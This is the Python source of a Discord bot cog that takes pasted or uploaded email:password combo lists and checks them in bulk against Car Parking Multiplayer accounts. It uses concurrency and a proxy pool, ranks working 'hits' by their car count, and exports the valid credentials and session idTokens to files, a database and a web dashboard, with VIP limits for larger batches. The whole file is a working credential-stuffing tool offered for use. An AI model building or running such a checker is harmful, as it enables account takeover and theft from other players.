import io
import os
import re
import time
import asyncio
import aiohttp
import discord
from discord import app_commands
from discord.ext import commands
from datetime import datetime
from typing import Optional, List, Tuple, Dict, Any

from config import RESULTS_DIR, MAX_CONCURRENT_TASKS
from database import db
from proxy_manager import proxy_mgr
from cpm_api import check_cpm_account

# =============================================================================
# 🛠️ YARDIMCI METİN İŞLEME FONKSİYONLARI
# =============================================================================
def parse_combo_lines(text: str) -> List[Tuple[str, str]]:
    """Metin içindeki email:şifre kombinasyonlarını ayıklar."""
    results = []
    lines = text.strip().splitlines()
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("//"):
            continue
        if ":" in line:
            parts = line.split(":", 1)
            e = parts[0].strip()
            p = parts[1].strip()
            if e and p:
                results.append((e, p))
        elif " " in line:
            parts = line.split(None, 1)
            e = parts[0].strip()
            p = parts[1].strip()
            if e and p:
                results.append((e, p))
    return results

def render_progress_bar(completed: int, total: int, length: int = 14) -> str:
    """Animasyonlu ilerleme çubuğu üretir."""
    if total <= 0:
        return "░" * length
    fraction = min(1.0, max(0.0, completed / total))
    filled = int(fraction * length)
    empty = length - filled
    return "█" * filled + "░" * empty

# =============================================================================
# ⚡ ORTAK TOPLU TARAMA MOTORU (BATCH ENGINE)
# =============================================================================
async def execute_batch_scan(
    bot: commands.Bot,
    raw_accounts: List[Tuple[str, str]],
    user_id: int,
    username: str,
    role_ids: List[int],
    progress_edit_fn
) -> Tuple[discord.Embed, List[discord.File]]:
    """Toplu tarama motorunu çalıştırır ve detaylı rapor hazırlar."""
    is_vip = await db.is_vip(user_id, role_ids=role_ids)
    user_limit = db.get_user_limit(user_id, is_vip)

    limit_notice = ""
    if len(raw_accounts) > user_limit:
        accounts = raw_accounts[:user_limit]
        status_name = "👑 Yönetici" if user_id in db.get_user_limit(user_id, True) == 500 else ("⭐ VIP Üye" if is_vip else "👤 Normal Üye")
        limit_notice = f"\n⚠️ **Not:** `{len(raw_accounts)}` hesap girildi, **{status_name}** limitiniz (`{user_limit} CPM`) kadar tarandı."
    else:
        accounts = raw_accounts

    total = len(accounts)
    valid_list = []
    invalid_list = []
    processed_count = 0

    session = getattr(bot, "http_session", None)
    close_session = False
    if session is None or session.closed:
        session = aiohttp.ClientSession()
        close_session = True

    start_time = time.time()
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_TASKS)
    last_update_time = [0.0]

    async def worker(acc: Tuple[str, str]):
        nonlocal processed_count
        e, p = acc
        async with semaphore:
            try:
                success, details, err_msg = await asyncio.wait_for(
                    check_cpm_account(session, e, p),
                    timeout=16.0
                )
            except asyncio.TimeoutError:
                success, details, err_msg = False, None, "Zaman Aşımı (Timeout)"
            except Exception as e_err:
                success, details, err_msg = False, None, str(e_err)

            processed_count += 1
            if success and details:
                valid_list.append(details)
            else:
                invalid_list.append((e, p, err_msg or "Bilinmeyen Hata"))

            # Discord mesajını her 1.8 saniyede bir canlı güncelle
            now = time.time()
            if (now - last_update_time[0] >= 1.8 or processed_count == total) and progress_edit_fn:
                last_update_time[0] = now
                pct = int((processed_count / total) * 100) if total > 0 else 0
                bar = render_progress_bar(processed_count, total, length=12)
                elapsed_cur = round(now - start_time, 1)

                prog_embed = discord.Embed(
                    title="⚡ Toplu Hesap Kontrolü Canlı Taranıyor...",
                    description=f"İşlem devam ediyor, lütfen bekleyin...{limit_notice}",
                    color=discord.Color.gold()
                )
                prog_embed.add_field(
                    name="📊 İlerleme Durumu",
                    value=f"`[{bar}] {pct}%` (**{processed_count}/{total}**)",
                    inline=False
                )
                prog_embed.add_field(name="✅ Çalışan (Hit)", value=f"**`{len(valid_list)}`**", inline=True)
                prog_embed.add_field(name="❌ Hatalı", value=f"`{len(invalid_list)}`", inline=True)
                prog_embed.add_field(name="⏳ Kalan", value=f"`{total - processed_count}`", inline=True)
                prog_embed.add_field(name="⏱️ Geçen Süre", value=f"`{elapsed_cur}s`", inline=True)
                prog_embed.add_field(name="🌐 Proxy Havuzu", value=f"`{proxy_mgr.count()} aktif`", inline=True)
                prog_embed.set_footer(text=f"Kullanıcı: {username} • CPM Turbo Motor")

                try:
                    await progress_edit_fn(prog_embed)
                except Exception:
                    pass

    try:
        tasks = [worker(acc) for acc in accounts]
        await asyncio.gather(*tasks)
    finally:
        if close_session:
            await session.close()

    elapsed = round(time.time() - start_time, 2)

    # İstatistik & Hit Kaydı
    await db.record_scan(user_id, "batch", total, len(valid_list), len(invalid_list), elapsed)
    if valid_list:
        await db.save_batch_hits(user_id, valid_list, username=username)

    # Araç sayısına göre azalan sıralama
    valid_list.sort(key=lambda x: (x.get('cpm_total_cars') or 0, x.get('cpm_level') or 0), reverse=True)

    # Yerel klasöre hatalı hesapları da kaydet
    user_folder = os.path.join(RESULTS_DIR, username)
    os.makedirs(user_folder, exist_ok=True)

    files_to_send = []

    # 1. calisan_hesaplar_sade.txt
    if valid_list:
        sade_buffer = io.StringIO()
        for acc in valid_list:
            sade_buffer.write(f"{acc['email']}:{acc['password']}\n")
        sade_bytes = io.BytesIO(sade_buffer.getvalue().encode("utf-8"))
        sade_bytes.seek(0)
        files_to_send.append(discord.File(sade_bytes, filename="calisan_hesaplar_sade.txt"))

    # 2. hatali_hesaplar.txt
    if invalid_list:
        inv_buffer = io.StringIO()
        inv_buffer.write(f"=====================================================\n")
        inv_buffer.write(f"❌ HATALI / AÇILMAYAN HESAPLAR VE NEDENLERİ\n")
        inv_buffer.write(f"Tarih       : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        inv_buffer.write(f"Kullanıcı   : {username}\n")
        inv_buffer.write(f"Toplam Hatalı: {len(invalid_list)} adet\n")
        inv_buffer.write(f"=====================================================\n\n")

        for inv in invalid_list:
            inv_buffer.write(f"{inv[0]}:{inv[1]} ➔ [{inv[2]}]\n")

        inv_bytes = io.BytesIO(inv_buffer.getvalue().encode("utf-8"))
        inv_bytes.seek(0)
        files_to_send.append(discord.File(inv_bytes, filename="hatali_hesaplar.txt"))

        try:
            with open(os.path.join(user_folder, "hatali_hesaplar.txt"), "w", encoding="utf-8") as f_inv:
                f_inv.write(inv_buffer.getvalue())
        except Exception:
            pass

    # 3. detayli_rapor.txt
    if valid_list:
        det_buffer = io.StringIO()
        det_buffer.write(f"=====================================================\n")
        det_buffer.write(f"🚗 CPM HESAP CHECKER DETAYLI RAPOR\n")
        det_buffer.write(f"Tarih       : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        det_buffer.write(f"Kullanıcı   : {username} ({user_id})\n")
        det_buffer.write(f"Toplam      : {total} | Geçerli: {len(valid_list)} | Hatalı: {len(invalid_list)}\n")
        det_buffer.write(f"=====================================================\n\n")

        for acc in valid_list:
            det_buffer.write(f"Hesap       : {acc['email']}:{acc['password']}\n")
            det_buffer.write(f"UID         : {acc.get('uid')}\n")
            det_buffer.write(f"Seviye      : Level {acc.get('cpm_level', 0)}\n")
            det_buffer.write(f"Toplam Araç : {acc.get('cpm_total_cars', 0)} (Açık: {acc.get('cpm_unlocked_cars', 0)}, Garaj: {acc.get('cpm_custom_cars', 0)})\n")
            det_buffer.write(f"Klan ID     : {acc.get('cpm_clan_id') or 'Yok'}\n")
            det_buffer.write(f"idToken     : {acc.get('idToken')}\n\n")

        det_bytes = io.BytesIO(det_buffer.getvalue().encode("utf-8"))
        det_bytes.seek(0)
        files_to_send.append(discord.File(det_bytes, filename="detayli_rapor.txt"))

    # Sonuç Embed Mesajı
    final_embed = discord.Embed(
        title="✨ Toplu Tarama Başarıyla Tamamlandı!",
        description=f"**{total}** hesap **{elapsed}** saniyede tarandı ve en dolu hesaplara göre sıralandı.{limit_notice}",
        color=discord.Color.green(),
        timestamp=datetime.now()
    )
    final_embed.add_field(name="📦 Toplam Taranan", value=f"**`{total}`**", inline=True)
    final_embed.add_field(name="✅ Çalışan / Hit", value=f"**`{len(valid_list)}`**", inline=True)
    final_embed.add_field(name="❌ Hatalı / Kapalı", value=f"**`{len(invalid_list)}`**", inline=True)

    # En Dolu İlk 5 Hesap
    if valid_list:
        top_text = ""
        for i, acc in enumerate(valid_list[:5], 1):
            top_text += f"**#{i}** `{acc['email']}` | 🚗 **{acc.get('cpm_total_cars', 0)} Araç** | ⭐ Lvl {acc.get('cpm_level', 0)}\n"
        final_embed.add_field(name="🏆 En Dolu İlk 5 Hesap", value=top_text, inline=False)

    # Açılmayan / Hatalı Hesaplar Doğrudan Discord Ekranında Gösterilir
    if invalid_list:
        inv_text = ""
        for i, inv in enumerate(invalid_list[:6], 1):
            inv_text += f"**#{i}** `{inv[0]}` ➔ `{inv[2]}`\n"
        if len(invalid_list) > 6:
            inv_text += f"*...ve {len(invalid_list) - 6} adet daha (hatali_hesaplar.txt dosyasında)*\n"
        final_embed.add_field(name=f"❌ Hatalı Hesaplar ({len(invalid_list)} adet)", value=inv_text, inline=False)

    final_embed.add_field(
        name="💾 Yerel Arşiv",
        value=f"Sonuçlar adınıza özel `results/{username}/` klasörüne ve [Web Dashboard](https://tempapims-efes-projects-602609c9.vercel.app)'a kaydedildi.",
        inline=False
    )
    final_embed.set_footer(text=f"İşlem Süresi: {elapsed} sn • CPM Bot")

    return final_embed, files_to_send

# =============================================================================
# 📋 MODAL FORMLARI (TEKLİ & TOPLU)
# =============================================================================
class SingleCheckModal(discord.ui.Modal, title="🚗 Tekli CPM Hesap Kontrolü"):
    email_input = discord.ui.TextInput(
        label="E-Posta (veya email:şifre)",
        placeholder="ornek@gmail.com veya ornek@gmail.com:123456",
        required=True
    )
    password_input = discord.ui.TextInput(
        label="Şifre",
        placeholder="Eğer ilk alana email:şifre yazdıysanız boş bırakın",
        required=False
    )

    def __init__(self, bot: commands.Bot):
        super().__init__()
        self.bot = bot

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)

        email = self.email_input.value.strip()
        pwd = self.password_input.value.strip()

        if ":" in email and not pwd:
            parts = email.split(":", 1)
            target_email = parts[0].strip()
            target_pass = parts[1].strip()
        else:
            target_email = email
            target_pass = pwd

        if not target_email or not target_pass:
            await interaction.followup.send("❌ Lütfen geçerli bir e-posta ve şifre girin!", ephemeral=True)
            return

        session = getattr(self.bot, "http_session", None)
        close_session = False
        if session is None or session.closed:
            session = aiohttp.ClientSession()
            close_session = True

        start_time = time.time()
        try:
            success, details, err_msg = await check_cpm_account(session, target_email, target_pass)
        finally:
            if close_session:
                await session.close()

        dur = time.time() - start_time
        await db.record_scan(interaction.user.id, "single", 1, 1 if success else 0, 0 if success else 1, dur)

        if success and details:
            await db.save_hit(interaction.user.id, details, username=interaction.user.name)

            unlocked_cnt = details.get("cpm_unlocked_cars", 0)
            custom_cnt = details.get("cpm_custom_cars", 0)
            total_cars = details.get("cpm_total_cars", max(unlocked_cnt, custom_cnt))
            level = details.get("cpm_level", 0)
            reports = details.get("cpm_reports", 0)
            can_play = details.get("cpm_can_play", 1)
            clan_id = details.get("cpm_clan_id") or "Yok"
            status_text = "🟢 **Temiz / Aktif**" if can_play == 1 else "🔴 **Kısıtlı / Yasaklı**"

            embed = discord.Embed(title="✅ CPM Hesap Bilgileri (Geçerli)", color=discord.Color.green(), timestamp=datetime.now())
            embed.add_field(name="📧 E-Posta", value=f"`{target_email}`", inline=True)
            embed.add_field(name="🔑 Şifre", value=f"||`{target_pass}`||", inline=True)
            embed.add_field(name="⭐ Seviye (Level)", value=f"**Level {level}**", inline=True)

            embed.add_field(name="🚗 Açık Araçlar", value=f"**{unlocked_cnt}** adet", inline=True)
            embed.add_field(name="🏎️ Garaj Araçları", value=f"**{custom_cnt}** adet", inline=True)
            embed.add_field(name="🏆 Toplam Araç", value=f"**{total_cars}** adet", inline=True)

            embed.add_field(name="🛡️ Rapor / Durum", value=f"`{reports}` rapor ({status_text})", inline=True)
            embed.add_field(name="🏰 Klan ID", value=f"`{clan_id}`", inline=True)
            embed.add_field(name="🆔 UID", value=f"`{details.get('uid', '-')}`", inline=False)

            embed.set_footer(text=f"💾 results/{interaction.user.name}/ klasörüne kaydedildi.")
            await interaction.followup.send(embed=embed, ephemeral=True)
        else:
            embed = discord.Embed(title="❌ CPM Giriş Başarısız", color=discord.Color.red())
            embed.add_field(name="📧 E-Posta", value=f"`{target_email}`", inline=True)
            embed.add_field(name="🔑 Şifre", value=f"||`{target_pass}`||", inline=True)
            embed.add_field(name="⚠️ Hata Nedeni", value=f"**{err_msg}**", inline=False)
            await interaction.followup.send(embed=embed, ephemeral=True)

class BatchCheckModal(discord.ui.Modal, title="📋 Toplu CPM Hesap Kontrolü"):
    accounts_input = discord.ui.TextInput(
        label="Hesap Listesi (Alt alta email:şifre)",
        style=discord.TextStyle.paragraph,
        placeholder="ornek1@gmail.com:sifre1\nornek2@gmail.com:sifre2\n...",
        required=True,
        max_length=4000
    )

    def __init__(self, bot: commands.Bot):
        super().__init__()
        self.bot = bot

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=False)

        raw_text = self.accounts_input.value
        accounts = parse_combo_lines(raw_text)

        if not accounts:
            await interaction.followup.send("❌ Geçerli `email:şifre` satırı bulunamadı!", ephemeral=True)
            return

        init_embed = discord.Embed(
            title="🚀 Toplu Hesap Kontrolü Başlatıldı",
            description=f"Toplam **{len(accounts)}** hesap taranıyor... Lütfen bekleyin.",
            color=discord.Color.gold()
        )
        init_msg = await interaction.followup.send(embed=init_embed)

        async def edit_progress(embed):
            try:
                await interaction.followup.edit_message(message_id=init_msg.id, embed=embed)
            except Exception:
                pass

        role_ids = [r.id for r in interaction.user.roles] if hasattr(interaction.user, "roles") else []
        final_embed, files = await execute_batch_scan(
            bot=self.bot,
            raw_accounts=accounts,
            user_id=interaction.user.id,
            username=interaction.user.name,
            role_ids=role_ids,
            progress_edit_fn=edit_progress
        )

        try:
            await init_msg.delete()
        except Exception:
            pass

        await interaction.followup.send(embed=final_embed, files=files)

# =============================================================================
# 🚗 CHECKPANEL VIEW (İNTERAKTİF BUTONLAR)
# =============================================================================
class CheckPanelView(discord.ui.View):
    def __init__(self, bot: commands.Bot):
        super().__init__(timeout=None)
        self.bot = bot

    @discord.ui.button(label="🔍 Tekli Hesap Kontrol Et", style=discord.ButtonStyle.primary, emoji="🚗", row=0)
    async def btn_single(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(SingleCheckModal(self.bot))

    @discord.ui.button(label="📋 Toplu Liste Yapıştır & Tara", style=discord.ButtonStyle.success, emoji="⚡", row=0)
    async def btn_batch(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(BatchCheckModal(self.bot))

    @discord.ui.button(label="📁 Dosya ile Toplu Tarama Rehberi", style=discord.ButtonStyle.secondary, emoji="📥", row=1)
    async def btn_file_info(self, interaction: discord.Interaction, button: discord.ui.Button):
        info_text = (
            "📁 **Dosya Yükleyerek Toplu Tarama Nasıl Yapılır?**\n\n"
            "1. İçinde satır satır `email:şifre` olan bir `.txt` dosyası hazırlayın.\n"
            "2. Discord sohbetine **`!toplu`** yazıp hazırladığınız `.txt` dosyasını ekleyin (upload edin).\n"
            "3. Veya `/toplu_kontrol` slash komutunun `dosya:` parametresine dosyanızı ekleyin.\n"
            "4. Bot tüm hesapları paralel hızda tarayıp sonuçları Discord'a ve web sitenize aktaracaktır!"
        )
        await interaction.response.send_message(info_text, ephemeral=True)

    @discord.ui.button(label="📊 İstatistiklerim", style=discord.ButtonStyle.secondary, emoji="📈", row=1)
    async def btn_stats(self, interaction: discord.Interaction, button: discord.ui.Button):
        u_stats = await db.get_user_stats(interaction.user.id)
        is_vip = await db.is_vip(interaction.user.id)
        limit = db.get_user_limit(interaction.user.id, is_vip)
        status_tag = "⭐ VIP Üye" if is_vip else "👤 Standart Üye"

        embed = discord.Embed(title="📊 Kişisel CPM Tarama İstatistikleri", color=discord.Color.blue())
        embed.add_field(name="Durum", value=f"**{status_tag}** (Limit: `{limit} CPM`)", inline=False)
        embed.add_field(name="Toplam Tarama", value=f"`{u_stats['scans']}` işlem", inline=True)
        embed.add_field(name="Taranan Hesap", value=f"`{u_stats['total_accs']}` adet", inline=True)
        embed.add_field(name="Bulunan Hit", value=f"**`{u_stats['hits']}`** adet", inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="🎯 Son Bulunan En Dolu Hitler", style=discord.ButtonStyle.secondary, emoji="🏆", row=2)
    async def btn_recent_hits(self, interaction: discord.Interaction, button: discord.ui.Button):
        hits = await db.get_recent_hits(limit=5, user_id=interaction.user.id)
        if not hits:
            await interaction.response.send_message("ℹ️ Henüz adınıza kayıtlı çalışan hesap bulunmuyor.", ephemeral=True)
            return
        txt = "**🏆 Adınıza Kayıtlı En Dolu Son 5 Hit:**\n\n"
        for i, h in enumerate(hits, 1):
            txt += f"**#{i}** `{h['email']}` | 🚗 **{h['total_cars']} Araç** | ⭐ Lvl {h['level']}\n"
        await interaction.response.send_message(txt, ephemeral=True)

def create_checkpanel_embed() -> discord.Embed:
    embed = discord.Embed(
        title="🚗 Car Parking Multiplayer • İnteraktif Hesap Kontrol Paneli",
        description=(
            "Aşağıdaki interaktif butonları kullanarak **tekli veya toplu** CPM hesap kontrolü yapabilirsiniz.\n\n"
            "⚡ **Özellikler:**\n"
            "• Tüm garaj araçları, açık araçlar ve oyun seviyesi doğrulanır.\n"
            "• Sonuçlar anında [Canlı Web Paneli](https://tempapims-efes-projects-602609c9.vercel.app)'ne ve yerel arşivinize aktarılır."
        ),
        color=discord.Color.purple(),
        timestamp=datetime.now()
    )
    embed.add_field(name="👤 Standart Limit", value="`25 CPM`", inline=True)
    embed.add_field(name="⭐ VIP Limit", value="`100 CPM`", inline=True)
    embed.add_field(name="👑 Yönetici Limit", value="`500 CPM`", inline=True)
    embed.set_footer(text="Car Parking Multiplayer Turbo Motor • !checkpanel")
    return embed

# =============================================================================
# 📦 CHECKER COG
# =============================================================================
class CheckerCog(commands.Cog, name="Hesap Kontrol"):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @app_commands.command(name="checkpanel", description="İnteraktif CPM Hesap Kontrol Panelini açar.")
    async def cmd_checkpanel_slash(self, interaction: discord.Interaction):
        embed = create_checkpanel_embed()
        view = CheckPanelView(self.bot)
        await interaction.response.send_message(embed=embed, view=view, ephemeral=False)

    @commands.command(name="checkpanel", aliases=["cp", "checkerpanel"])
    async def cmd_checkpanel_prefix(self, ctx: commands.Context):
        """DM ve Sunucuda !checkpanel komutu"""
        embed = create_checkpanel_embed()
        view = CheckPanelView(self.bot)
        await ctx.reply(embed=embed, view=view)

    @app_commands.command(name="check", description="Tek bir CPM hesabını kontrol eder.")
    @app_commands.describe(
        email="Hesap e-posta adresi (veya email:şifre formatında combo)",
        sifre="Hesap şifresi (eğer ilk alana email:şifre yazdıysanız boş bırakabilirsiniz)",
        gizli="Sonucu sadece siz görecek şekilde gizli göndersin mi? (Varsayılan: Evet)"
    )
    async def cmd_check_slash(
        self,
        interaction: discord.Interaction,
        email: str,
        sifre: Optional[str] = None,
        gizli: bool = True
    ):
        await interaction.response.defer(ephemeral=gizli)

        if ":" in email and not sifre:
            parts = email.split(":", 1)
            target_email = parts[0].strip()
            target_pass = parts[1].strip()
        else:
            target_email = email.strip()
            target_pass = sifre.strip() if sifre else ""

        if not target_email or not target_pass:
            await interaction.followup.send("❌ Lütfen geçerli bir e-posta ve şifre girin!", ephemeral=gizli)
            return

        session = getattr(self.bot, "http_session", None)
        close_session = False
        if session is None or session.closed:
            session = aiohttp.ClientSession()
            close_session = True

        start_time = time.time()
        try:
            success, details, err_msg = await check_cpm_account(session, target_email, target_pass)
        finally:
            if close_session:
                await session.close()

        dur = time.time() - start_time
        await db.record_scan(interaction.user.id, "single", 1, 1 if success else 0, 0 if success else 1, dur)

        if success and details:
            await db.save_hit(interaction.user.id, details, username=interaction.user.name)

            unlocked_cnt = details.get("cpm_unlocked_cars", 0)
            custom_cnt = details.get("cpm_custom_cars", 0)
            total_cars = details.get("cpm_total_cars", max(unlocked_cnt, custom_cnt))
            level = details.get("cpm_level", 0)
            reports = details.get("cpm_reports", 0)
            can_play = details.get("cpm_can_play", 1)
            clan_id = details.get("cpm_clan_id") or "Yok"
            uid = details.get("uid", "Bilinmiyor")
            status_text = "🟢 **Temiz / Aktif**" if can_play == 1 else "🔴 **Kısıtlı / Yasaklı**"

            embed = discord.Embed(title="✅ CPM Hesap Bilgileri (Geçerli)", color=discord.Color.green(), timestamp=datetime.now())
            embed.add_field(name="📧 E-Posta", value=f"`{target_email}`", inline=True)
            embed.add_field(name="🔑 Şifre", value=f"||`{target_pass}`||", inline=True)
            embed.add_field(name="⭐ Seviye (Level)", value=f"**Level {level}**", inline=True)

            embed.add_field(name="🚗 Açık Araçlar", value=f"**{unlocked_cnt}** adet", inline=True)
            embed.add_field(name="🏎️ Garaj Araçları", value=f"**{custom_cnt}** adet", inline=True)
            embed.add_field(name="🏆 Toplam Araç", value=f"**{total_cars}** adet", inline=True)

            embed.add_field(name="🛡️ Rapor Sayısı", value=f"`{reports}` rapor ({status_text})", inline=True)
            embed.add_field(name="🏰 Klan ID", value=f"`{clan_id}`", inline=True)
            embed.add_field(name="🆔 UID", value=f"`{uid}`", inline=False)
            embed.set_footer(text=f"Sorgulayan: {interaction.user.name} • results/{interaction.user.name}/ klasörüne kaydedildi 💾")
            await interaction.followup.send(embed=embed, ephemeral=gizli)
        else:
            embed = discord.Embed(title="❌ CPM Giriş Başarısız", color=discord.Color.red(), timestamp=datetime.now())
            embed.add_field(name="📧 E-Posta", value=f"`{target_email}`", inline=True)
            embed.add_field(name="🔑 Şifre", value=f"||`{target_pass}`||", inline=True)
            embed.add_field(name="⚠️ Hata Nedeni", value=f"**{err_msg}**", inline=False)
            embed.set_footer(text=f"Sorgulayan: {interaction.user.name}")
            await interaction.followup.send(embed=embed, ephemeral=gizli)

    @commands.command(name="check", aliases=["c", "tekli"])
    async def cmd_check_prefix(self, ctx: commands.Context, *, args: str = None):
        """DM ve Sunucuda !check email:şifre"""
        if not args:
            await ctx.reply("❌ Kullanım: `!check email:şifre` veya `!check email şifre`")
            return

        args = args.strip()
        if ":" in args:
            parts = args.split(":", 1)
            email = parts[0].strip()
            pwd = parts[1].strip()
        elif " " in args:
            parts = args.split(None, 1)
            email = parts[0].strip()
            pwd = parts[1].strip()
        else:
            await ctx.reply("❌ Lütfen geçerli bir e-posta ve şifre girin! Örnek: `!check ornek@gmail.com:123456`")
            return

        session = getattr(self.bot, "http_session", None)
        close_session = False
        if session is None or session.closed:
            session = aiohttp.ClientSession()
            close_session = True

        start_time = time.time()
        try:
            success, details, err_msg = await check_cpm_account(session, email, pwd)
        finally:
            if close_session:
                await session.close()

        dur = time.time() - start_time
        await db.record_scan(ctx.author.id, "single", 1, 1 if success else 0, 0 if success else 1, dur)

        if success and details:
            await db.save_hit(ctx.author.id, details, username=ctx.author.name)
            unlocked_cnt = details.get("cpm_unlocked_cars", 0)
            custom_cnt = details.get("cpm_custom_cars", 0)
            total_cars = details.get("cpm_total_cars", max(unlocked_cnt, custom_cnt))
            level = details.get("cpm_level", 0)
            reports = details.get("cpm_reports", 0)
            can_play = details.get("cpm_can_play", 1)
            clan_id = details.get("cpm_clan_id") or "Yok"
            status_text = "🟢 Temiz / Aktif" if can_play == 1 else "🔴 Kısıtlı"

            embed = discord.Embed(title="✅ CPM Hesap Bilgileri (Geçerli)", color=discord.Color.green(), timestamp=datetime.now())
            embed.add_field(name="📧 E-Posta", value=f"`{email}`", inline=True)
            embed.add_field(name="🔑 Şifre", value=f"||`{pwd}`||", inline=True)
            embed.add_field(name="⭐ Seviye", value=f"Level {level}", inline=True)
            embed.add_field(name="🚗 Toplam Araç", value=f"**{total_cars}** adet (Açık: {unlocked_cnt}, Garaj: {custom_cnt})", inline=True)
            embed.add_field(name="🛡️ Rapor / Durum", value=f"`{reports}` rapor ({status_text})", inline=True)
            embed.add_field(name="🏰 Klan ID", value=f"`{clan_id}`", inline=True)
            embed.set_footer(text=f"results/{ctx.author.name}/ klasörüne kaydedildi 💾")
            await ctx.reply(embed=embed)
        else:
            embed = discord.Embed(title="❌ CPM Giriş Başarısız", color=discord.Color.red())
            embed.add_field(name="📧 E-Posta", value=f"`{email}`", inline=True)
            embed.add_field(name="🔑 Şifre", value=f"||`{pwd}`||", inline=True)
            embed.add_field(name="⚠️ Hata Nedeni", value=f"**{err_msg}**", inline=False)
            await ctx.reply(embed=embed)

    @commands.command(name="toplu", aliases=["batch", "t"])
    async def cmd_batch_prefix(self, ctx: commands.Context, *, args: Optional[str] = None):
        """DM ve Sunucuda !toplu komutu (Metin veya Dosya eki)"""
        text_content = ""
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]
            try:
                content_bytes = await attachment.read()
                text_content = content_bytes.decode("utf-8", errors="ignore")
            except Exception as e:
                await ctx.reply(f"❌ Dosya okunurken hata oluştu: {e}")
                return
        elif args:
            text_content = args

        if not text_content:
            embed = create_checkpanel_embed()
            view = CheckPanelView(self.bot)
            await ctx.reply("ℹ️ Lütfen bir `.txt` dosyası ekleyin veya paneli kullanarak listenizi yapıştırın:", embed=embed, view=view)
            return

        accounts = parse_combo_lines(text_content)
        if not accounts:
            await ctx.reply("❌ Geçerli `email:şifre` satırı bulunamadı!")
            return

        init_embed = discord.Embed(
            title="🚀 Toplu Hesap Kontrolü Başlatıldı",
            description=f"Toplam **{len(accounts)}** hesap taranıyor... Lütfen bekleyin.",
            color=discord.Color.gold()
        )
        init_msg = await ctx.reply(embed=init_embed)

        async def edit_progress(embed):
            try:
                await init_msg.edit(embed=embed)
            except Exception:
                pass

        role_ids = [r.id for r in ctx.author.roles] if hasattr(ctx.author, "roles") else []
        final_embed, files = await execute_batch_scan(
            bot=self.bot,
            raw_accounts=accounts,
            user_id=ctx.author.id,
            username=ctx.author.name,
            role_ids=role_ids,
            progress_edit_fn=edit_progress
        )

        try:
            await init_msg.delete()
        except Exception:
            pass

        await ctx.reply(embed=final_embed, files=files)

    @app_commands.command(name="toplu_kontrol", description="Dosya yükleyerek VEYA doğrudan liste yapıştırarak toplu CPM kontrolü yapar.")
    @app_commands.describe(
        dosya="İçinde satır satır email:şifre olan .txt dosyası (opsiyonel)",
        liste="Doğrudan metin olarak alt alta email:şifre listesi (opsiyonel)",
        gizli="Sonuç sadece size mi görünsün? (Varsayılan: Hayır)"
    )
    async def cmd_batch_slash(
        self,
        interaction: discord.Interaction,
        dosya: Optional[discord.Attachment] = None,
        liste: Optional[str] = None,
        gizli: bool = False
    ):
        if not dosya and not liste:
            await interaction.response.send_modal(BatchCheckModal(self.bot))
            return

        await interaction.response.defer(ephemeral=gizli)

        text_content = ""
        if dosya:
            try:
                content_bytes = await dosya.read()
                text_content = content_bytes.decode("utf-8", errors="ignore")
            except Exception as e:
                await interaction.followup.send(f"❌ Dosya okunurken hata oluştu: {e}", ephemeral=gizli)
                return
        elif liste:
            text_content = liste

        accounts = parse_combo_lines(text_content)
        if not accounts:
            await interaction.followup.send("❌ Geçerli `email:şifre` satırı bulunamadı!", ephemeral=gizli)
            return

        init_embed = discord.Embed(
            title="🚀 Toplu Hesap Kontrolü Başlatıldı",
            description=f"Toplam **{len(accounts)}** hesap taranıyor... Lütfen bekleyin.",
            color=discord.Color.gold()
        )
        init_msg = await interaction.followup.send(embed=init_embed, ephemeral=gizli)

        async def edit_progress(embed):
            try:
                await interaction.followup.edit_message(message_id=init_msg.id, embed=embed)
            except Exception:
                pass

        role_ids = [r.id for r in interaction.user.roles] if hasattr(interaction.user, "roles") else []
        final_embed, files = await execute_batch_scan(
            bot=self.bot,
            raw_accounts=accounts,
            user_id=interaction.user.id,
            username=interaction.user.name,
            role_ids=role_ids,
            progress_edit_fn=edit_progress
        )

        try:
            await init_msg.delete()
        except Exception:
            pass

        await interaction.followup.send(embed=final_embed, files=files, ephemeral=gizli)

async def setup(bot: commands.Bot):
    await bot.add_cog(CheckerCog(bot))
